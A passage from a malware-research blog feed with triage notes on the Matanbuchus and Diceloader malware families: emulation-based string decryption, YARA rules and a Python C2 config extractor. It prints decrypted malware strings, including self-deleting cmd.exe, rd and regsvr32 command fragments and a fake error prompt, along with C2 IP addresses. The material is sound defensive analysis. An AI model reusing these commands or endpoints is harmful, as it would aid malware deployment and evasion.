Bots upgrade Running dll in memory #2 (DllRegisterServer) tbesqn . Different Sample From Same Family . This is clearly a different sample based on the decrypted strings, but it seems to be part of the matanbuchus family... maybe this is a payload instead of a loader? The sample matches analysis from this blog: Introduction of a PE file extractor for various situations&gt; . We need to figure out why these samples are so different... . Taking a Closer Look At Obfuscated Samples . Obfuscated sample . b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e - does match yara (2021-11-12 11:47:44 UTC) | . Rony . bd68ecd681b844232f050c21c1ea914590351ef64e889d8ef37ea63bd9e2a2ec - doesn&#39;t match yara (2022-06-14 10:30:32 UTC) | . These samples appear to be the same (they are likely the &quot;payload&quot; portion of Matanbuchus) but the earlier sample uses obfuscated string encryption, while the newer sample uses the simpler stack based string encryption. . Fixing our Yara Rule to Match the Stack Based String Encryption Payload (as well as loaders) . This was a simple fix! The payload does not contain the murmur hash code, once we removed that the yara rule matched all samples. . Let&#39;s Take a Look At the Obfusacated Strings . We know that the one sample we have that is a &quot;payload&quot; will likely have some of the same strings as the obfuscated sample so let&#39;s pull these our first as a reference. . b&#39;Content-Length: x00&#39; b&#39;C: Windows System32 WindowsPowerShell v1.0 powershell.exe x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;DllRegisterServer x00&#39; b&#39;097f5m x00&#39; b&#39;Running dll in memory #3 (DllInstall(Unstall)) x00&#39; b&#39;runas x00&#39; b&#39;.exe x00&#39; b&#39;timeout /t 3 &amp;&amp; move /Y x00&#39; b&#39;Running dll in memory #3 (DllInstall(Install)) x00&#39; b&#39;.exe x00&#39; b&#39;.exe x00&#39; b&#39;TiC7 x00&#39; b&#39;.nls x00&#39; b&#39;Run PS in memory x00&#39; b&#39;Admin x00&#39; b&#39;%LOCALAPPDATA% x00&#39; b&#39;DllInstall x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;Not in domain x00&#39; b&#39;regsvr32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;%APPDATA% x00&#39; b&#39;41.4.0 x00&#39; b&#39;8QN04 x00&#39; b&#39;64 Bit x00&#39; b&#39;8S2x x00&#39; b&#39;Starting the exe with parameters x00&#39; b&#39;C: Windows System32 cmd.exe /c x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;High start exe x00&#39; b&#39;Running exe x00&#39; b&#39;User-Agent: x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;Content-Type: application/x-www-form-urlencoded x00&#39; b&#39;%APPDATA% x00&#39; b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ x00&#39; b&#39; explorer.exe x00&#39; b&#39;MemLoadDllMain || MemLoadExe x00&#39; b&#39;Run CMD in memory x00&#39; b&#39;3CEk x00&#39; b&#39;3m7x x00&#39; b&#39;.nls x00&#39; b&#39;%APPDATA% x00&#39; b&#39;NCST x00&#39; b&#39;BCha x00&#39; b&quot;/c ECHO &#39;You must restart the program to resolve a critical error!&#39; &amp;&amp; start x00&quot; b&#39;7eriel x00&#39; b&#39;%APPDATA% x00&#39; b&#39;.nls x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&quot; &#39;z{VIS rA6 rb x00&quot; b&#39;%LOCALAPPDATA% x00&#39; b&#39;IsWow64Process x00&#39; b&#39;rundll32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;kernel32 x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39;User x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39; r n r n x00&#39; b&#39; rXOGONSEzBER% x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39; nost: x00&#39; b&#39;MemLoadShellCode x00&#39; b&#39;Q6X6 x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;cmd.exe x00&#39; b&#39;%02X-%02X-%02X-%02X-%02X-%02X x00&#39; b&#39;Running dll in memory #2 (DllRegisterServer) x00&#39; b&#39;Crypt update &amp; Bots upgrade x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;3fe11 x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;NSeyDX x00&#39; b&#39;%APPDATA% x00&#39; b&#39;4nes x00&#39; b&#39;jpofxs x00&#39; b&#39;Not in domain x00&#39; b&#39;DllInstall x00&#39; b&#39; &amp;&amp; rd /s /q x00&#39; b&#39; &amp;&amp; regsvr32.exe -e &quot; x00&#39; b&#39;32 Bit x00&#39; b&#39;%USERDOMAIN% x00&#39; . from dumpulator import Dumpulator, syscall from dumpulator.native import * import pefile @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) functs = [0x74040976,0x740409A4,0x740409BA,0x74040998,0x7404098C,0x7403F910,0x7403F91C,0x7403F967,0x7403F9B2,0x7403F9FD,0x7403FA48,0x7403FA93,0x7403FADE,0x7403FB44,0x7403FBAE,0x7403FC20,0x7403FC98,0x7403FD06,0x7403FD74,0x7403FDDD,0x7403FE43,0x7403FEBF,0x7403FF46,0x7403FFD5,0x74040065,0x740400DC,0x74040146,0x740401A2,0x740401FE,0x7404025A,0x740402B6,0x74040312,0x74040378,0x740403D4,0x74040438,0x7404048B,0x740404DE,0x74040542,0x7404059E,0x740405F1,0x74040644,0x740406A0,0x74040706,0x7404074F,0x740407AB,0x74040807,0x7404085A,0x740408B6,0x7404091A] functs = [0x7403FC98] for fn in functs: dp.call(fn,[]) data_start = 0x7407E000 data_end = 0x74080228 for ptr in range(data_start,data_end,4): try: ss = dp.read_str(dp.read_ptr(ptr)) if len(ss) &gt;= 4: print(ss) except: continue print(&quot; n n n === n&quot;) print(dp.read_str(dp.read_ptr(0x7407FDFC ))) . Failed to read module data C: Users IEUser Desktop DLLLoader32_82D6.exe &#34;C: Users IEUser Desktop DLLLoader32_82D6.exe&#34; Q6X6 zkC7 rJqU e03ed 3CEk Uninstall 3fe11 Running exe au5o Starting the exe with parameters 3m7x Run CMD in memory Run PS in memory Running dll in memory #3 (DllInstall(Unstall)) Running dll in memory #3 (DllInstall(Install)) Regsvr32 &amp; Execute MemLoadDllMain || MemLoadExe b2tb hszA zNETjp 5deb9c DS2x Run EXE with admin rights TAMfm RunDll32 &amp; Execute wgjv Crypt update &amp; Bots upgrade f1da nX8y Running dll in memory #2 (DllRegisterServer) tbesqn === Running exe . FILE_PATH = &#39;/tmp/samples/b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e.bin&#39; file_data = open(FILE_PATH,&#39;rb&#39;).read() def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(data): return re.match(B&quot;^[ s!-~]+ 0*$&quot;, data) is not None # .text:74049A7D C6 45 B8 0D mov byte ptr [ebp-48h], 13 # .text:74049A81 C7 45 E0 6E 60 69 23 mov dword ptr [ebp-20h], 2369606Eh # .text:74049A88 C7 45 E4 68 75 68 2D mov dword ptr [ebp-1Ch], 2D687568h # .text:74049A8F C7 45 E8 22 6E 2D 00 mov dword ptr [ebp-18h], 2D6E22h # .text:74049A96 C7 45 EC DA 4E 1E 00 mov dword ptr [ebp-14h], 1E4EDAh test_data = unhex(&#39;895db4c645b80dc745e06e606923c745e46875682dc745e8226e2d00c745ecda4e1e0052&#39;) stack_strings = [] string_egg = rb&#39;(?P&lt;a&gt;(?: xC6 x45..){1})(?P&lt;b&gt;(?: xC7 x45.....){2,})&#39; for m in re.finditer(string_egg, file_data): match_data = m.group(0) #print(tohex(match_data)) key = m[&#39;a&#39;][3] raw_data = m[&#39;b&#39;] str_data = b&#39;&#39; for i in range(0,len(raw_data),7): str_data += raw_data[i:i+7][-4:] print(xor_decrypt(str_data, bytes([key]))) . b&#39;Shell32.dllR&#39; b&#39;Matanbuc&#39; b&#39; HTTP/1.&#39; b&#39;User-Agent: &#39; b&#39;DllInsta&#39; b&#39;DllInsta&#39; b&#39;cmd.exe /c x05 xdfK x1b x05&#39; b&#39; &amp;&amp; rd /s /q&#39; b&#39;cmd.exe /c r xd7C x13 r&#39; . # .text:7404406B C7 45 AC 71 5D 48 5D mov dword ptr [ebp-54h], 5D485D71h # .text:74044072 C7 45 B0 52 5E 49 5F mov dword ptr [ebp-50h], 5F495E52h # .text:74044079 C7 45 B4 54 49 4F 0A mov dword ptr [ebp-4Ch], 0A4F4954h # .text:74044080 66 C7 45 B8 0A 0A mov word ptr [ebp-48h], 0A0Ah # .text:74048CF5 C6 45 B8 31 mov byte ptr [ebp-48h], 31h ; &#39;1&#39; # .text:74048CF9 C7 45 E0 75 5D 5D 78 mov dword ptr [ebp-20h], 785D5D75h # .text:74048D00 C7 45 E4 5F 42 45 50 mov dword ptr [ebp-1Ch], 5045425Fh # .text:74048D07 66 C7 45 E8 5D 5D mov word ptr [ebp-18h], 5D5Dh # .text:74048D0D 88 5D EA mov [ebp-16h], bl # .text:74048D10 C7 45 EC DA 4E 1E 00 mov dword ptr [ebp-14h], 1E4EDAh # .text:740454A9 30 14 08 xor [eax+ecx], dl # .text:740454AC 41 inc ecx # .text:740454AD 83 F9 1D cmp ecx, 1Dh . File &#34;&lt;ipython-input-82-89ec58536910&gt;&#34;, line 18 80 b0 d8 ff 07 74 a8 40 83 f8 06 ^ SyntaxError: invalid syntax . from dumpulator import Dumpulator, syscall from dumpulator.native import * import pefile @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) start_addr = 0x74044390 end_addr = 0x740443C1 dp.start(start_addr, end=end_addr) dp.read(dp.regs.ebx, 14) . Failed to read module data . bytearray(b&#39;193.56.146.60 &#39;) . String Decryption Recap . With these older samples, there are 3 different string decryption methods used . Stack strings build with DWORDs that are decrypted using a single byte XOR, the byte is the first byte pushed onto the stack string (this is the same method used for small strings in the new samples) | Global strings that are generated using constructors which have some light obfuscation. To deal with these we simply emulate all of the constructors and scrape the global strings from the .data section of the PE. | The third and most complex method relies on two calls to functions used to build the encrypted string and then a simple single-byte XOR to decrypt the string. | . Complex Third String Decryption Method . c6 45 c4 53 57 6a 08 740458C7 .text:740436A5 BE DA 4E 1E 00 mov esi, 1E4EDAh .text:740436AA 89 9D 28 FF FF FF mov [ebp+var_D8], ebx .text:740436B0 89 9D 2C FF FF FF mov [ebp+var_D4], ebx BE DA ?? ?? ?? 89 ?? ?? ?? ?? ?? 89 .text:740480FF 89 5D B0 mov [ebp-50h], ebx .text:74048102 8B D3 mov edx, ebx .text:74048104 89 5D B4 mov [ebp-4Ch], ebx .text:74048107 89 5D B8 mov [ebp-48h], ebx .text:7404810A C6 45 BC 1A mov byte ptr [ebp-44h], 1Ah 89 ?? ?? 8b ?? 89 ?? ?? 89 ?? ?? c6 45 .text:740431A2 72 F7 jb short loc_7404319B .text:740431A4 88 59 0C mov [ecx+12], bl .text:740438E2 72 F7 jb short loc_740438DB .text:740438E4 88 59 0B mov [ecx+0Bh], bl . from dumpulator import Dumpulator, syscall from dumpulator.native import * import pefile @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS def emulate(start_addr, end_addr, ret_reg, str_len): dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) dp.start(start_addr, end=end_addr) return dp.read(dp.regs.__getitem__(ret_reg), str_len) pe = pefile.PE(data=file_data) em_egg = rb&#39; xBE xDA... x89..... x89.+?(?= x72 xf7 x88)&#39; for m in re.finditer(em_egg, file_data): start_offset = m.start() end_offset = m.end() + 2 start_addr = pe.get_rva_from_offset(start_offset) + 0x74030000 end_addr = pe.get_rva_from_offset(end_offset) + 0x74030000 str_len = file_data[end_offset + 2] if file_data[end_offset + 1] == 0x5f: reg_name = &#39;edi&#39; elif file_data[end_offset + 1] == 0x59: reg_name = &#39;ecx&#39; print(f&quot;Testing: {hex(start_addr)}&quot;) try: print(emulate(start_addr, end_addr, reg_name, str_len )) except: print(&quot;fail&quot;) continue . Testing: 0x74042f48 Failed to read module data bytearray(b&#39;IPHLPAPI.DLL&#39;) Testing: 0x740430ce Failed to read module data bytearray(b&#39;IPHLPAPI.DLL&#39;) Testing: 0x740436a5 Failed to read module data bytearray(b&#39; xfb xcc xf5 xfc xd5i xd2 t xf7nz&#39;) Testing: 0x74043814 Failed to read module data bytearray(b&#39; x98 xe7 xe1 x13- x0fo xc0hUY&#39;) Testing: 0x74043991 Failed to read module data fail .",
            "url": "https://research.openanalysis.net/matanbuchus/loader/yara/triage/dumpulator/emulation/2022/06/19/matanbuchus-triage.html",
            "relUrl": "/matanbuchus/loader/yara/triage/dumpulator/emulation/2022/06/19/matanbuchus-triage.html",
            "date": " ‚Ä¢ Jun 19, 2022"
        }
        
    
  
    
        ,"post43": {
            "title": "Diceloader Triage Notes",
            "content": "Overview . According to Mandiant.. . the DiceLoader framework, a known toolkit that helps attackers gain a foothold in infected systems and perform reconnaissance . According to Twitter... . twitter:https://twitter.com/c3rb3ru5d3d53c/status/1348667319665487874 . and ... #FIN7As reported by @KorbenD_Intel, the initial powershell script use DeflateStream method for uncompress the zip in memory and extract it. This execute the second layer that heavily obfuscated. More 70 functions are used for reorder the data for sensible strings and the implant pic.twitter.com/f8CTvtaf2m . &mdash; Arkbird (@Arkbird_SOLG) September 29, 2020 . and ... For those tracking #FIN7 - #TAKEOUT is the powershell memory dropper that has been seen dropping #CARBANAK OR #DICELOADER - there&#39;s some confusion going on..ClearTemp.ps1 files == TAKEOUTPayloads embedded == CARBANAK || DICELOADER . &mdash; Dan Perez (@MrDanPerez) January 7, 2021 . According to Dan Perez at Mandiant... . For those tracking #FIN7 - #TAKEOUT is the powershell memory dropper that has been seen dropping #CARBANAK OR #DICELOADER - there&#39;s some confusion going on.. ClearTemp.ps1 files == TAKEOUT Payloads embedded == CARBANAK || DICELOADER . References . MalwareBazaar &quot;diceloader&quot; tag- Attributed to GOLD NIAGARA (carbon spider) | Attributed to FIN7 | Possible that Lizar is an earlier version of Diceloader | . Triage Notes . Sample: 2d88767c424d05330839e568b32f9f52962df56b1d3021f69930167fe623efd1 . Creation Time: 2021-07-15 15:46:07 UTC . First Submission: 2022-03-20 23:22:32 UTC . The sample is an x64 DLL with two exports | One of the exports is a reflective PE loader (possibly copy-paste from metasploit) | There is a mutex string Global %08x that is built as a stack string | . .text:0000000180001749 C7 44 24 30 47 6C 6F 62 mov dword ptr [rsp+228h+var_mutex], 626F6C47h .text:0000000180001751 C7 44 24 34 61 6C 5C 25 mov dword ptr [rsp+228h+var_mutex+4], 255C6C61h .text:0000000180001759 C7 44 24 38 30 38 78 00 mov dword ptr [rsp+228h+var_mutex+8], 783830h . The .data section containst two encrypted blobs with a 32-byte key sandwitched between them. | The first encrypted blob seems to contain a port number | . 01 bb 01 11 bb 01 00 00 00 90 f1 . The second encrypted blob contains C2 IP addresses separated with a | | . 46.17.107.7|185.250.151.33 x00 . Yara . Initial Attempt . import &quot;pe&quot; rule diceloader { meta: description = &quot;Identifies diceloader&quot; strings: // gobal stack string // C7 44 24 30 47 6C 6F 62 mov dword ptr [rsp+228h+var_mutex], 626F6C47h // C7 44 24 34 61 6C 5C 25 mov dword ptr [rsp+228h+var_mutex+4], 255C6C61h // C7 44 24 38 30 38 78 00 mov dword ptr [rsp+228h+var_mutex+8], 783830h $x1 = { C7 ?? ?? ?? 47 6C 6F 62 C7 ?? ?? ?? 61 6C 5C 25 C7 ?? ?? ?? 30 38 78 00 } // fnv1 // 48 FF C1 inc rcx // 33 C2 xor eax, edx // 69 C0 93 01 00 01 imul eax, 1000193h $x2 = { 48 FF C1 33 C2 69 C0 93 01 00 01 } // sleep(1000) // B9 10 27 00 00 mov ecx, 2710h ; dwMilliseconds // FF 15 B3 13 00 00 call cs:Sleep $x3 = {B9 10 27 00 00 ff} // hash for NtFlushInstructionCache // 81 F9 B8 0A 4C 53 cmp ecx, 534C0AB8h // 75 16 jnz short loc_7FFA3BA4121E $x4 = { 81 F9 B8 0A 4C 53 75 } condition: pe.is_64bit() and all of ($x*) } . Hunt . rule diceloader_hunt { meta: description = &quot;Identifies diceloader - danger hunt rule&quot; strings: // Mod 31 for key length // C1 FA 04 sar edx, 4 // 8B C2 mov eax, edx // C1 E8 1F shr eax, 1Fh // 03 D0 add edx, eax // 6B C2 1F imul eax, edx, 1Fh $x1 = { C1 FA 04 8B C2 C1 E8 1F 03 D0 6B C2 1F } condition: all of ($x*) } . Final Rule . import &quot;pe&quot; rule diceloader { meta: description = &quot;Identifies diceloader&quot; strings: // Mod 31 for key length // C1 FA 04 sar edx, 4 // 8B C2 mov eax, edx // C1 E8 1F shr eax, 1Fh // 03 D0 add edx, eax // 6B C2 1F imul eax, edx, 1Fh $mod = { C1 FA 04 8B C2 C1 E8 1F 03 D0 6B C2 1F } // Reflective loader - not in all versions // B8 4D 5A 00 00 mov eax, &#39;ZM&#39; // 66 41 39 07 cmp [r15], ax // 75 1B jnz short loc_18000106D // 49 63 57 3C movsxd rdx, dword ptr [r15+3Ch] // 48 8D 4A C0 lea rcx, [rdx-40h] // 48 81 F9 BF 03 00 00 cmp rcx, 3BFh // 77 0A ja short loc_18000106D // 42 81 3C 3A 50 45 00 00 cmp dword ptr [rdx+r15], &#39;EP&#39; // 74 05 jz short loc_180001072 $reflective = { B8 4D 5A 00 00 66 41 39 07 75 ?? 49 63 57 3C 48 8D 4A C0 48 81 F9 BF 03 00 00 77 ?? 42 81 3C 3A 50 45 00 00 } // Fnv1 Algrithm - only in new versions $fnv1 = {33 ?? 69 ?? 93 01 00 01} condition: pe.is_64bit() and $mod and ($reflective or $fnv1) } . Config Extraction . We want to pull out the C2 IP addresses and ports. . Research . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct import re def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) . FILE_PATH = &#39;/tmp/087435ef6cddc58d40ba6ba8b4bb60b2ead9873bf1cb5c0702bbf31e3199b343.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) data_section_offset= None data_section_end_offset = None for s in pe.sections: if b&#39;.data x00&#39; in s.Name: data_section_offset = s.PointerToRawData data_section_end_offset = s.PointerToRawData + s.SizeOfRawData break # Find the key based on it being passed as an arg # # BD 1F 00 00 00 mov ebp, 1Fh # 4C 8D 05 68 1E 00 00 lea r8, key # 44 8B CD mov r9d, ebp # 49 8B CE mov rcx, r14 # 8D 75 F7 lea esi, [rbp-9] # 8B D6 mov edx, esi # E8 50 FE FF FF call sub_7FFA3BA420B8 egg = rb&#39; xBD x1F x00 x00 x00 x4C x8D x05(....)&#39; key = None for m in re.finditer(egg, file_data): rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 print(f&quot;rel offset: {hex(rel_offset)}&quot;) # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() + 5 print(f&quot;match offset: {hex(match_offset)}&quot;) match_rva = pe.get_rva_from_offset(match_offset) print(f&quot;match rva: {hex(match_rva)}&quot;) key_rva = match_rva + rel_offset print(f&quot;key rva: {hex(key_rva)}&quot;) key_offset = pe.get_offset_from_rva(key_rva) print(f&quot;key offset: {hex(key_offset)}&quot;) key = file_data[key_offset:key_offset+31] print(tohex(key)) # Use the key position to locate the other two data blobs blob1 = file_data[data_section_offset:key_offset] blob2 = file_data[key_offset+31:data_section_end_offset] out_blob1 = xor_decrypt(blob1, key) print(tohex(out_blob1[:20])) port = struct.unpack(&#39;&gt;H&#39;,out_blob1[:2])[0] print(f&quot;Port: {port}&quot;) out_blob2 = xor_decrypt(blob2.lstrip(b&#39; x00&#39;), key) c2_ips = out_blob2.split(b&#39; x00&#39;)[0].split(b&#39;|&#39;) for c2 in c2_ips: print(f&quot;c2: {c2}&quot;) . rel offset: 0x1e6f match offset: 0x1651 match rva: 0x2251 key rva: 0x40c0 key offset: 0x2ec0 b&#39;d78ad7388e21900836048ecf3f6dfd67349f5620d616d9f81e9d9c4892a159&#39; b&#39;01bb0111bb010000001eba4105c94ba5875574b7&#39; Port: 443 c2: b&#39;194.180.174.86&#39; c2: b&#39;193.42.36.231&#39; . FILE_PATH = &#39;/tmp/7747707df3951b0de6b9a18f7597fb2819009163f61186393798a6167897e2f8.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) data_section_offset= None data_section_end_offset = None for s in pe.sections: if b&#39;.data x00&#39; in s.Name: data_section_offset = s.PointerToRawData data_section_end_offset = s.PointerToRawData + s.SizeOfRawData break # 48 8D 15 80 23 00 00 lea rdx, key # 8A 04 10 mov al, [rax+rdx] # 41 30 01 xor [r9], al egg = rb&#39; x48 x8D x15(....) x8A x04 x10 x41 x30 x01&#39; key = None for m in re.finditer(egg, file_data): rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 print(f&quot;rel offset: {hex(rel_offset)}&quot;) # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() print(f&quot;match offset: {hex(match_offset)}&quot;) match_rva = pe.get_rva_from_offset(match_offset) print(f&quot;match rva: {hex(match_rva)}&quot;) key_rva = match_rva + rel_offset print(f&quot;key rva: {hex(key_rva)}&quot;) key_offset = pe.get_offset_from_rva(key_rva) print(f&quot;key offset: {hex(key_offset)}&quot;) key = file_data[key_offset:key_offset+31] print(tohex(key)) # Use the key position to locate the other two data blobs blob1 = file_data[data_section_offset:key_offset] blob2 = file_data[key_offset+31:data_section_end_offset] out_blob1 = xor_decrypt(blob1, key) print(tohex(out_blob1[:20])) port = struct.unpack(&#39;&gt;H&#39;,out_blob1[:2])[0] print(f&quot;Port: {port}&quot;) out_blob2 = xor_decrypt(blob2.lstrip(b&#39; x00&#39;), key) c2_ips = out_blob2.split(b&#39; x00&#39;)[0].split(b&#39;|&#39;) for c2 in c2_ips: print(f&quot;c2: {c2}&quot;) . rel offset: 0x2387 match offset: 0x1139 match rva: 0x1d39 key rva: 0x40c0 key offset: 0x2ac0 b&#39;b54c55213e963325fba55eb30c987148f0e8b9165e884bf0f6ed190c1d3d4b&#39; b&#39;01990501bb01015000013500000000f7eb5785b7&#39; Port: 409 c2: b&#39;195.123.227.40&#39; . def parse_ports(data): out_ports = [] for ptr in range(0,len(data)-3,3): if data[ptr] == 0: break tmp_port = struct.unpack(&#39;&lt;H&#39;,data[ptr+1:ptr+3])[0] out_ports.append(tmp_port) return out_ports parse_ports(unhex(&#39;01990501bb01015000013500000000f7eb5785b7&#39;)) . [1433, 443, 80, 53] . Final Config Extractor . import pefile import struct import re def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def get_key_offset(pe, file_data): # Try new method first -- key is passed as an argument # # BD 1F 00 00 00 mov ebp, 1Fh # 4C 8D 05 68 1E 00 00 lea r8, key # 44 8B CD mov r9d, ebp # 49 8B CE mov rcx, r14 # 8D 75 F7 lea esi, [rbp-9] # 8B D6 mov edx, esi # E8 50 FE FF FF call sub_7FFA3BA420B8 egg = rb&#39; xBD x1F x00 x00 x00 x4C x8D x05(....)&#39; for m in re.finditer(egg, file_data): try: rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() + 5 match_rva = pe.get_rva_from_offset(match_offset) key_rva = match_rva + rel_offset key_offset = pe.get_offset_from_rva(key_rva) # Return if we have something return key_offset except Exception: continue # If we are here the new method didn&#39;t work let&#39;s try the old method # The key is directly referenced in a crypto routine # 48 8D 15 80 23 00 00 lea rdx, key # 8A 04 10 mov al, [rax+rdx] # 41 30 01 xor [r9], al egg = rb&#39; x48 x8D x15(....) x8A x04 x10 x41 x30 x01&#39; for m in re.finditer(egg, file_data): try: rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() match_rva = pe.get_rva_from_offset(match_offset) key_rva = match_rva + rel_offset key_offset = pe.get_offset_from_rva(key_rva) # Return if we have something return key_offset except Exception: continue # If we got here we failed return None def get_data_section_bounds(pe): data_section_offset= None data_section_end_offset = None for s in pe.sections: if b&#39;.data x00&#39; in s.Name: data_section_offset = s.PointerToRawData data_section_end_offset = s.PointerToRawData + s.SizeOfRawData break return data_section_offset,data_section_end_offset def parse_ports(data): out_ports = [] for ptr in range(0,len(data)-3,3): if data[ptr] == 0: break tmp_port = struct.unpack(&#39;&lt;H&#39;,data[ptr+1:ptr+3])[0] out_ports.append(tmp_port) return out_ports def get_config(data): c2s = [] pe = pefile.PE(data=file_data) key_offset = get_key_offset(pe, file_data) if key_offset is None: print(&quot;Error - no key offset found!&quot;) return c2s key = file_data[key_offset:key_offset+31] data_section_offset,data_section_end_offset = get_data_section_bounds(pe) if data_section_offset is None: print(&quot;Error - no .data section&quot;) return c2s ports_data = file_data[data_section_offset:key_offset] ips_data = file_data[key_offset+31:data_section_end_offset] ports_ptxt_data = xor_decrypt(ports_data, key) ports = parse_ports(ports_ptxt_data) ports = set(ports) ips_ptxt_data = xor_decrypt(ips_data.lstrip(b&#39; x00&#39;), key) c2_ips = ips_ptxt_data.split(b&#39; x00&#39;)[0].split(b&#39;|&#39;) # Sometimes the port data is messed up # In this case just skip it if len(ports) == 0 or len(ports) &gt; 5: return [ip.decode(&#39;ascii&#39;) for ip in c2_ips] for ip in c2_ips: for port in ports: c2s.append(ip.decode(&#39;ascii&#39;)+&quot;:&quot;+str(port)) return c2s . targets = [&quot;/tmp/diceloader/2d88767c424d05330839e568b32f9f52962df56b1d3021f69930167fe623efd1.exe&quot;, &quot;/tmp/diceloader/0f76768f65775329d7a0ddb977ea822d992d086ce48a23679cef66e3b4d2f4ed.exe&quot;, &quot;/tmp/diceloader/extracted_implant.bin&quot;, &quot;/tmp/diceloader/bc3ce7f2ea9d33374a1373965625b7d0d6a010a2de5ddccbb8e1d819622187c6.exe&quot;, &quot;/tmp/diceloader/f32b8b0530ed068b47817d165064e99800a44a943ccae0e32f6b6b3e40c79638.exe&quot;, &quot;/tmp/7747707df3951b0de6b9a18f7597fb2819009163f61186393798a6167897e2f8.bin&quot;, &quot;/tmp/diceloader2.bin&quot;, &quot;/tmp/087435ef6cddc58d40ba6ba8b4bb60b2ead9873bf1cb5c0702bbf31e3199b343.bin&quot;, &quot;/tmp/met.bin&quot;, &quot;/tmp/diceloader.bin&quot;, &quot;/tmp/4d933b6b60a097ad5ce5876a66c569e6f46707b934ebd3c442432711af195124.bin&quot;, &quot;/tmp/2d88767c4.bin&quot;, &quot;/tmp/dicefail.bin&quot;] for fp in targets: file_data = open(fp, &#39;rb&#39;).read() print(get_config(file_data)) . [&#39;46.17.107.7:443&#39;, &#39;185.250.151.33:443&#39;] [&#39;46.17.107.32:443&#39;, &#39;185.250.151.141:443&#39;] [&#39;195.123.227.40:80&#39;, &#39;195.123.227.40:1433&#39;, &#39;195.123.227.40:443&#39;, &#39;195.123.227.40:53&#39;] [&#39;185.232.170.205:443&#39;, &#39;94.140.114.173:443&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] [&#39;195.123.227.40:80&#39;, &#39;195.123.227.40:1433&#39;, &#39;195.123.227.40:443&#39;, &#39;195.123.227.40:53&#39;] [&#39;194.180.174.86:443&#39;, &#39;193.42.36.231:443&#39;] [&#39;194.180.174.86:443&#39;, &#39;193.42.36.231:443&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] [&#39;195.123.214.181:443&#39;] [&#39;46.17.107.7:443&#39;, &#39;185.250.151.33:443&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] .",
            "url": "https://research.openanalysis.net/downloader/diceloader/yara/triage/2022/06/16/diceloader.html",
            "relUrl": "/downloader/diceloader/yara/triage/2022/06/16/diceloader.html",
            "date": " ‚Ä¢ Jun 16, 2022"
        }
        
    
  
    
        ,"post44": {
            "title": "Malware Downloader Triage Notes",
